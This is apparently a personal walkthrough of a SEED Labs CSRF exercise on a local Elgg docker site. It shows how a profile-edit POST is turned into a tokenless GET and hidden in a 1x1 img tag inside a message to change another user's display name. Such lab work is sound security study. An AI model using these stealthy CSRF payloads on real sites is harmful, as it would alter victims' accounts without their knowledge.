# Definition
Something to do!!
## Installing and Preparing lab
I will use Web [CSRF Elgg](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip) docker machine to practice this vulnerability.
```shell
wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip
unzip Labsetup.zip
rm Labsetup.zip
cd Labsetup
```
___
Then, we must remove the line number 41 (*name: net-10.9.0.0*) to avoid ERROR with network name and after that deploy the machine.
```shell
docker-compose up -d
```
___
After, we have to add docker machine URLs into **/etc/hosts** to use www.seed-server.com of the docker machine.
![[Pasted image 20230714155121.png]]
___
We will be using this user credentials.
```txt
alice:seedalice
samy:seedsamy
```
# Attacking
## Understanding
First, we should know that each user has an identifier and we can see it by doing a *hover* over the **Add friend** button you can know his **guid**.
![[Pasted image 20230714163036.png]]
___
To begin we could use [[BurpSuite]] to intercept the **Save** button when we change our *Display name* to see the request and do analytics on it.
![[Pasted image 20230714163722.png]]
![[Pasted image 20230714163745.png]]
![[Pasted image 20230714164033.png]]
The **Save** button uses POST method to send data and also uses two interestings variables.
___
Well, to apply CSRF we should change the POST method by GET. In BurpSuite and in the Repeater section you can do this.
![[Pasted image 20230714164529.png]]
___
You should see this.
![[Pasted image 20230714164551.png]]
___
Let's try to send this GET request but without those two interesting variables.
![[Pasted image 20230714165334.png]]
___
Now, this GET request done us a redirect (302) to another site.
![[Pasted image 20230714165608.png]]
___
## Being Bad
Now that you can use this link to change the *Display name* of the current user by using his own *giud*.
```url
http://www.seed-server.com/action/profile/edit?name=ALICE_AGAIN&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56
```
___
So, for instance. If you want to change the **Samy**, with giud **59**, Display name, you should change the guid parametter in the link.
```url
http://www.seed-server.com/action/profile/edit?name=SAMY_CHANGED&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=59
```
___
Now, you should find out some way of that the **Samy** user cans do click on this link.
You can achieve that by sending a message inside the www.seed-server-.com web like a [[XSS Basics]].
As *Alice* user.
![[Pasted image 20230714170932.png]]
![[Pasted image 20230714171151.png]]
___
Firt, we should figure out if *Message* field cans interprets HTML.
```html
<h1>Hello</h1>
Hello Alice :D
```
___
Now, as *Samy* user you can read the message sent by *Alice*.
![[Pasted image 20230714171638.png]]
___
So, you can now use a *image* HTML label to inject the above malicious link, just like this.
To be more stealth you should add *alt*, *widht* and *height* for don't see image error.
*Message* field.
```url
<img src="http://www.seed-server.com/action/profile/edit?name=SAMY_CHANGED&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=59" alt="image" width="1" height="1"/>
```
![[Pasted image 20230714172344.png]]
___
Now, when **Samy** user reads the *Alice* message his **Display name** will be changed.
![[Pasted image 20230714172523.png]]
![[Pasted image 20230714172544.png]]
___
Finally, you can vary this CSRF to do what you want by intercepting the request and then injecting the malicious GET link like a XSS.